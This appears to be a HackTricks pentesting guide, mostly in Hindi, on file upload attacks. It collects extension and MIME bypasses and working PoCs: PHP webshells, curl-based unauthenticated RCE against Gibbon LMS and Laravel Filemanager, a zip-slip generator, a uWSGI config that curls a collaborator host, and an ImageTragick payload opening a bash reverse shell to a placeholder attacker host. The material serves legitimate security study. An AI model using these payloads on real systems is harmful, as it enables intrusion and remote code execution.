# फाइल अपलोड

{{#include ../../banners/hacktricks-training.md}}

## फाइल अपलोड सामान्य कार्यप्रणाली

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. यदि लागू हो, तो **पहले बताए गए एक्सटेंशन्स** की जाँच करें। इन्हें कुछ **uppercase letters** के साथ भी टेस्ट करें: _pHp, .pHP5, .PhAr ..._
2. _जाँचें **execution extension के पहले एक valid extension जोड़ने** से क्या होता है (पिछले एक्सटेंशन भी उपयोग करें):_
- _file.png.php_
- _file.png.Php5_
3. अंत में **विशेष अक्षर** जोड़ने की कोशिश करें। आप Burp का उपयोग करके सभी **ascii** और **Unicode** अक्षरों को **bruteforce** कर सकते हैं। (_टिप: आप **पहले बताए गए** एक्सटेंशन्स का भी उपयोग कर सकते हैं_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. सर्वर-साइड के **extension parser** को धोखा देकर सुरक्षा को बायपास करने की कोशिश करें — जैसे **extension को डबल करना** या extensions के बीच **junk** डेटा (**null** bytes) जोड़ना। _बेहतर payload तैयार करने के लिए आप **पहले बताए गए** एक्सटेंशन्स का भी उपयोग कर सकते हैं।_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. पिछले चेक में **एक और एक्सटेंशन स्तर** जोड़ें:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. कोशिश करें कि **exec extension को valid extension के पहले** रखें और उम्मीद करें कि सर्वर misconfigured है। (यह Apache misconfigurations का फायदा उठाने में उपयोगी है जहाँ किसी भी फ़ाइल जिसका extension **.php** हो, भले ही वह _ending_ में `.php` न हो, code execute कर सकती है):
- _ex: file.php.png_
7. **Windows** में **NTFS alternate data stream (ADS)** का उपयोग करें। इस मामले में, एक colon character ":" को एक forbidden extension के बाद और एक permitted extension से पहले डाल दिया जाएगा। परिणामस्वरूप, सर्वर पर एक **खाली फ़ाइल जिसकी extension forbidden है** बनाई जा सकती है (उदा. "file.asax:.jpg”). इस फ़ाइल को बाद में अन्य तकनीकों से edit किया जा सकता है, जैसे इसकी short filename का उपयोग करना। "**::$data**” पैटर्न का उपयोग non-empty फ़ाइलें बनाने के लिए भी किया जा सकता है। इसलिए इस पैटर्न के बाद एक dot character जोड़ना आगे की रोकथामों को बायपास करने में उपयोगी हो सकता है (उदा. "file.asp::$data.”)
8. filename limits को तोड़ने की कोशिश करें। valid extension कट जाती है और malicious PHP बच जाता है. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

कुछ upload handlers saved filename से trailing dot characters को trim या normalize कर देते हैं। UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) के 2.9.1 से पहले के संस्करणों में, आप extension validation को निम्न तरीके से बायपास कर सकते हैं:

- एक valid image MIME और magic header का उपयोग करें (उदा., PNG’s `\x89PNG\r\n\x1a\n`)।
- अपलोड की गई फ़ाइल का नाम PHP extension के बाद एक dot जोड़कर रखें, उदाहरण के लिए `shell.php.`।
- सर्वर trailing dot को हटा देता है और `shell.php` को persist कर देता है, जो कि web-served directory में रखा जाए (डिफ़ॉल्ट public storage जैसे `/storage/files/`) तो execute होगा।

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
फिर सहेजे गए path को हिट करें (Laravel + LFM में सामान्यतः):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- unisharp/laravel-filemanager को ≥ 2.9.1 में अपग्रेड करें.
- कड़े server-side allowlists लागू करें और persisted filename को पुनः validate करें.
- uploads को non-executable स्थानों से serve करें.

### Content-Type, Magic Number, Compression & Resizing को बायपास करना

- **Content-Type** जांच को बायपास करने के लिए **Content-Type** **header** के **value** को सेट करें: _image/png_, _text/plain_, application/octet-stream
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** चेक को बायपास करने के लिए फाइल की शुरुआत में एक वास्तविक image के **bytes** जोड़ें ( _file_ कमांड को भ्रमित करें)। या shell को **metadata** के अंदर डालें:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` या आप payload को सीधे image में भी डाल सकते हैं:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- यदि आपकी image पर **compression** जोड़ी जा रही है, उदाहरण के लिए कुछ standard PHP libraries जैसे [PHP-GD](https://www.php.net/manual/fr/book.image.php) का उपयोग करके, तो पिछले तरीके उपयोगी नहीं होंगे। हालांकि, आप **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर सकते हैं ताकि कुछ टेक्स्ट insert किया जा सके जो **compression में बच जाए**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- वेब पेज image को **resizing** भी कर सकता है, उदाहरण के लिए PHP-GD के `imagecopyresized` या `imagecopyresampled` का उपयोग करके। हालांकि, आप **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर कुछ टेक्स्ट डाल सकते हैं जो **compression में बच जाए**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- एक और तकनीक ऐसी payload बनाने की है जो image resizing में **बच जाए**, PHP-GD के `thumbnailImage` फ़ंक्शन का उपयोग करते हुए। आप **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर कुछ टेक्स्ट insert कर सकते हैं जो **compression में बच जाए**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### अन्य ट्रिक्स जांचने के लिए

- पहले से अपलोड की गई फ़ाइल का extension बदलने के लिए उसे **rename** करने की vulnerability खोजें।
- backdoor को execute करने के लिए **Local File Inclusion** vulnerability खोजें।
- **Possible Information disclosure**:
1. एक ही फ़ाइल को **कई बार** (और **एक ही समय** में) **उसी नाम** के साथ अपलोड करें।
2. किसी फ़ाइल या फ़ोल्डर के **नाम** वाला एक फ़ाइल अपलोड करें जो **पहले से मौजूद** हो।
3. ऐसी फ़ाइल अपलोड करना जिसका नाम **"." , "..", or "…"** हो। उदाहरण के लिए, Apache में **Windows** पर, यदि एप्लिकेशन अपलोड की गई फाइलों को "/www/uploads/" डायरेक्टरी में सेव करता है, तो "." filename "/www/" डायरेक्टरी में uploads” नाम की फ़ाइल बना देगा।
4. ऐसी फ़ाइल अपलोड करें जिसे आसानी से हटाया न जा सके, जैसे **"…:.jpg"** in **NTFS**। (Windows)
5. **Windows** में ऐसे invalid characters जैसे `|<>*?”` वाले नाम के साथ फ़ाइल अपलोड करें। (Windows)
6. **Windows** में reserved (forbidden) **names** जैसे CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9 का उपयोग करके फ़ाइल अपलोड करें।
- कोशिश करें **upload an executable** (.exe) या एक **.html** (कम संदिग्ध) अपलोड करने की जो गलती से victim द्वारा खोले जाने पर **कोड execute करेगा**।

### Special extension tricks

यदि आप **PHP server** पर फाइलें अपलोड करने की कोशिश कर रहे हैं, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
यदि आप **ASP server** पर फाइलें अपलोड करने की कोशिश कर रहे हैं, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` फाइलें java के लिए `.jar` जैसी होती हैं, लेकिन php के लिए, और इन्हें **php फ़ाइल की तरह उपयोग किया जा सकता है** (php से execute करना, या किसी script में include करना...)।

`.inc` extension कभी-कभी उन php फाइलों के लिए उपयोग किया जाता है जो केवल फाइलें **import** करने के लिए हैं, इसलिए, किसी बिंदु पर, किसी ने इस **extension को execute होने की अनुमति** दी हो सकती है।

## **Jetty RCE**

यदि आप Jetty server में एक XML फ़ाइल अपलोड कर सकते हैं तो आप [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1) प्राप्त कर सकते हैं। जैसा कि निम्न चित्र में बताया गया है, XML फ़ाइल को `$JETTY_BASE/webapps/` में अपलोड करें और shell की उम्मीद करें!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

इस vulnerability की विस्तृत जांच के लिए मूल रिसर्च देखें: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities को uWSGI servers में तब एक्सप्लॉइट किया जा सकता है जब किसी को `.ini` configuration file को modify करने की क्षमता हो। uWSGI configuration files एक विशिष्ट syntax का उपयोग करते हैं जिसमें "magic" variables, placeholders, और operators शामिल होते हैं। विशेष रूप से, '@' operator, जिसका उपयोग `@(filename)` के रूप में होता है, किसी फाइल की सामग्री को include करने के लिए डिज़ाइन किया गया है। uWSGI में समर्थित विभिन्न schemes में से, "exec" scheme विशेष रूप से शक्तिशाली है, जो किसी process के standard output से डेटा पढ़ने की अनुमति देता है। यह फीचर तब दुरुपयोग किया जा सकता है जब किसी `.ini` configuration file को प्रोसेस किया जाए, जिससे Remote Command Execution या Arbitrary File Write/Read जैसे परिणाम सामने आ सकते हैं।

निम्नलिखित खतरनाक `uwsgi.ini` फ़ाइल के उदाहरण पर विचार करें, जो विभिन्न schemes दिखाती है:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
पेलोड का execution configuration file के parsing के दौरान होता है। Configuration को activate और parse होने के लिए, uWSGI process को या तो restart करना होगा (संभवतः crash के बाद या Denial of Service attack के कारण) या file को auto-reload पर सेट होना चाहिए। अगर auto-reload feature enabled है, तो changes detect होने पर यह निर्धारित intervals पर file को reload कर देता है।

यह समझना महत्वपूर्ण है कि uWSGI के configuration file parsing में lax व्यवहार है। विशेष रूप से, यहाँ चर्चा किए गए पेलोड को किसी binary file (जैसे image या PDF) में insert किया जा सकता है, जिससे संभावित exploitation की सीमा और बढ़ जाती है।

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Gibbon LMS में एक unauthenticated endpoint web root के अंदर arbitrary file write की अनुमति देता है, जिससे PHP file डालकर pre-auth RCE हो सकता है। Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server type/name को ignore करता है, tail को base64-decode करता है)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
एक न्यूनतम webshell डालें और कमांड्स निष्पादित करें:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
नोट्स:
- हैंडलर `;` और `,` द्वारा split करने के बाद `base64_decode($_POST["img"])` चलाता है, फिर extension/type सत्यापित किए बिना बाइट्स को `$absolutePath . '/' . $_POST['path']` पर लिखता है।
- परिणामी कोड वेब सर्विस उपयोगकर्ता के रूप में चलता है (उदा., XAMPP Apache on Windows).

इस बग के संदर्भ में usd HeroLab advisory और NVD entry शामिल हैं। नीचे References सेक्शन देखें।

## **wget File Upload/SSRF Trick**

कुछ मामलों में आप पाएंगे कि सर्वर **`wget`** का उपयोग **फ़ाइलें डाउनलोड करने** के लिए कर रहा है और आप **URL** बता सकते हैं। ऐसे मामलों में, कोड यह जाँच कर सकता है कि डाउनलोड की गई फ़ाइलों का extension whitelist के अंदर है ताकि केवल अनुमत फाइलें ही डाउनलोड हों। हालांकि, **इस जाँच को बायपास किया जा सकता है।**\
**linux** में एक **filename** की **maximum** लंबाई **255** है, हालांकि, **wget** फाइलनामों को **236** characters तक truncate कर देता है। आप **download a file called "A"*232+".php"+".gif"** कर सकते हैं — यह filename **check** को **bypass** कर देगा (इस उदाहरण में **".gif"** एक **valid** extension है) लेकिन `wget` फ़ाइल का नाम बदलकर **"A"*232+".php"** कर देगा।
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

कुछ legacy upload handlers जो `snprintf()` या इसी तरह के functions का उपयोग single-file upload से multi-file arrays बनाने के लिए करते हैं, उन्हें `_FILES` structure कोforge करने के लिए trick किया जा सकता है। `snprintf()` के व्यवहार में inconsistencies और truncation के कारण, ध्यानपूर्वक बनाया गया एक single upload सर्वर साइड पर multiple indexed files के रूप में दिखाई दे सकता है, जिससे उस logic में confusion पैदा हो सकती है जो एक strict shape मानती है (उदाहरण के लिए, इसे multi-file upload समझ कर unsafe branches पर जाना)। आज के समय में यह पैटर्न niche है, लेकिन यह “index corruption” pattern कभी-कभार CTFs और पुराने codebases में फिर से उभरता है।

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

विसंपीड़न के दौरान निर्देशिकाओं में फाइलों का अनपेक्षित निर्माण एक महत्वपूर्ण समस्या है। शुरुआती धारणा के बावजूद कि यह सेटअप malicious file uploads के जरिए OS-level command execution से सुरक्षा प्रदान कर सकता है, hierarchical compression support और ZIP archive format की directory traversal क्षमताओं का दुरुपयोग किया जा सकता है। इससे हमलावर प्रतिबंधों को बायपास करके लक्षित एप्लिकेशन की decompression functionality को manipulate करके secure upload directories से बाहर निकल सकते हैं।

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). The utility can be used as shown:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
इसके अतिरिक्त, **symlink trick with evilarc** एक विकल्प है। यदि लक्ष्य `/flag.txt` जैसी किसी फ़ाइल को निशाना बनाना है, तो उस फ़ाइल के लिए अपने सिस्टम में एक symlink बनाना चाहिए। यह सुनिश्चित करता है कि evilarc को अपने संचालन के दौरान त्रुटियाँ न हों।

नीचे Python कोड का एक उदाहरण है जो एक हानिकारक zip फ़ाइल बनाने के लिए उपयोग किया जाता है:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

अधिक जानकारी के लिए **मूल पोस्ट देखें**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP code लिखा जाता है ताकि `$_REQUEST` वेरिएबल के माध्यम से पास किए गए कमांड्स को execute किया जा सके।

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: कई फाइलें बनाई जाती हैं और इन फ़ाइलों को शामिल करके एक zip archive बनाया जाता है।

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip के अंदर की फाइलों के नाम vi या hex editor का उपयोग कर बदल दिए जाते हैं, "xxA" को "../" में बदलकर डायरेक्टरी traversal किया जाता है।

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

इस सामग्री को image extension के साथ upload करें ताकि इस vulnerability का exploit किया जा सके **(ImageMagick , 7.0.1-1)** (from the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG पर PHP Shell एम्बेड करना

PNG फ़ाइल के IDAT chunk में PHP shell एम्बेड करने से कुछ image processing operations को प्रभावी ढंग से बायपास किया जा सकता है। PHP-GD की `imagecopyresized` और `imagecopyresampled` फ़ंक्शन इस संदर्भ में विशेष रूप से प्रासंगिक हैं, क्योंकि इन्हें आमतौर पर images को resizing और resampling के लिए उपयोग किया जाता है। एम्बेड किया गया PHP shell इन ऑपरेशनों से अप्रभावित रहने की क्षमता कुछ उपयोग मामलों के लिए एक महत्वपूर्ण लाभ है।

इस तकनीक का विस्तृत अन्वेषण, उसकी कार्यप्रणाली और संभावित उपयोगों सहित, निम्न लेख में दिया गया है: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). यह संसाधन इस प्रक्रिया और इसके प्रभावों की व्यापक समझ प्रदान करता है।

अधिक जानकारी: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot फ़ाइलें

Polyglot फ़ाइलें साइबरसुरक्षा में एक अनूठा साधन हैं, जो चेमेलियन की तरह काम करती हैं और एक साथ कई फ़ाइल फ़ॉर्मैट्स में वैध रूप से मौजूद रह सकती हैं। एक रोचक उदाहरण [GIFAR](https://en.wikipedia.org/wiki/Gifar) है, जो एक हाइब्रिड है और एक साथ GIF और RAR archive की तरह काम करता है। ये फ़ाइलें केवल इसी जोड़ी तक सीमित नहीं हैं; GIF और JS या PPT और JS जैसी संयोजन भी संभव हैं।

Polyglot फ़ाइलों की मुख्य उपयोगिता यह है कि वे उन सुरक्षा उपायों को बायपास कर सकती हैं जो फ़ाइल प्रकार के आधार पर फ़ाइलों की स्क्रीनिंग करते हैं। कई एप्लिकेशन में केवल कुछ फ़ाइल प्रकारों (जैसे JPEG, GIF, या DOC) को upload करने की अनुमति दी जाती है ताकि संभावित हानिकारक फ़ॉर्मैट्स (जैसे JS, PHP, या Phar files) के जोखिम को कम किया जा सके। हालांकि, एक polyglot, कई फ़ाइल प्रकारों की संरचनात्मक आवश्यकताओं के अनुरूप होकर, इन प्रतिबंधों को चुपके से बायपास कर सकता है।

फिर भी, polyglots को सीमाएँ मिलती हैं। उदाहरण के लिए, जबकि एक polyglot एक साथ PHAR file (PHp ARchive) और JPEG दोनों का रूप धारण कर सकता है, उसकी upload की सफलता प्लेटफ़ॉर्म की file extension नीतियों पर निर्भर कर सकती है। यदि सिस्टम अनुमत एक्सटेंशन के प्रति सख्त है, तो polyglot की केवल संरचनात्मक द्वैतता उसके अपलोड की गारंटी देने के लिए पर्याप्त नहीं हो सकती।

अधिक जानकारी: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### यदि PDF जैसा बनाकर वैध JSON अपलोड करना

कैसे फाइल टाइप डिटेक्शन से बचें: वैध JSON फ़ाइल अपलोड करके, भले ही अनुमति न हो, उसे PDF फ़ाइल बनाकर फेक करके (तकनीकें **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** से):

- **`mmmagic` library**: यदि `%PDF` magic bytes पहले 1024 bytes में हैं तो इसे वैध माना जाता है (उदाहरण के लिए पोस्ट देखें)
- **`pdflib` library**: JSON के एक field के अंदर एक फेक PDF format डालें ताकि library इसे pdf समझ ले (उदाहरण के लिए पोस्ट देखें)
- **`file` binary**: यह एक फ़ाइल से 1048576 bytes तक पढ़ सकता है। बस JSON को इससे बड़ा बना दें ताकि यह सामग्री को json के रूप में पार्स न कर सके और फिर JSON के अंदर असली PDF का प्रारंभिक हिस्सा डाल दें और यह इसे PDF समझ लेगा

## References

